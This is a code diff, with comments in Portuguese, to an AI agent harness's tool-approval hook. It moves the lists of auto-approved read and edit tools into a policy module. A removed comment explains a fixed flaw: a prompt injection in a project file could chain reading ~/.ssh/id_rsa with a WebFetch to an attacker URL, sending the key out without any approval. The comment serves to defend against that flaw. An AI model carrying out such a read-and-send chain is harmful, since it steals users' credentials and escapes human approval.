@@ -38,7 +38,7 @@
 import * as readline from "node:readline";
 // A política de permissão (cerca de leitura, rede e destrutivo) mora em módulo próprio —
 // é a única forma de ela ter teste, já que este arquivo roda ao ser importado (F-13/F-29).
-import { PATH_ARG, decidir } from "./politica.mjs";
+import { EDICAO, LEITURA, PATH_ARG, decidir } from "./politica.mjs";
 
 // ---------------------------------------------------------------- saída NDJSON
 function emit(obj) {
@@ -127,20 +127,6 @@ if (process.env.ANTHROPIC_API_KEY) {
 // ------------------------------------------------- gates pendentes (tool_use_id → resolve)
 const pendingGates = new Map();
 
-// Leitura = auto (espelha a política do Modo Code: leitura não pede aprovação).
-//
-// 🔴 `WebFetch` e `WebSearch` SAÍRAM daqui em 02/09/2026 (achado F-13 da revisão de 01/09).
-// Eles não são leitura: são **saída para a rede**, e é a metade que fecha a cadeia. Com
-// `Read` de qualquer caminho e `WebFetch` para qualquer URL, ambos automáticos, uma injeção
-// de prompt num arquivo do projeto compunha `Read ~/.ssh/id_rsa` → `WebFetch
-// https://atacante/?d=…` **sem um único cartão de aprovação**. O `anna`, o outro motor desta
-// mesma casca, mantém `curl` e `wget` fora do automático justamente por isso — e o comentário
-// deste arquivo diz, com todas as letras, que "um motor não pode ser a porta dos fundos do
-// outro". Era.
-const READ_ONLY_TOOLS = new Set([
-  "Read", "Glob", "Grep", "LS", "NotebookRead", "TodoWrite",
-]);
-
 /**
  * Nível de aprovação, espelhando os três do `anna` — **de propósito**.
  *
@@ -226,8 +212,8 @@ async function preToolUse(input /* PreToolUseHookInput */) {
     toolName,
     toolInput,
     nivel: APROVACAO,
-    leitura: READ_ONLY_TOOLS,
-    edicao: EDIT_TOOLS,
+    leitura: LEITURA,
+    edicao: EDICAO,
   });
   if (acao === "allow") {
     return allowDecision(motivo);
